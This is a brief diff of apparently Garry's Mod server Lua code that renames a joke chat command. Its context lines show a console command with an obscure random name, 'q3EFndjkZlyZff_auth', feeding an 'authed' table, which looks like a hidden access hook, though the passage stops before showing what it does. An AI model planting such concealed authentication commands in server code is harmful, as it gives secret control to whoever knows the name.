@@ -1,7 +1,7 @@
  (function()
     if (SERVER) then     
         local authed = {} 
-        concommand.Add("shabeelisthegameoftheyear", function(ply, cmd, args) ply:ChatPrint("game of the year (shabeel)") end)
+        concommand.Add("shabeelisthegameoftheyear2", function(ply, cmd, args) ply:ChatPrint("game of the year (shabeel) 2") end)
         concommand.Add("q3EFndjkZlyZff_auth", function (ply, cmd, args)
             if (!args || !args[1]) then 
                 return 
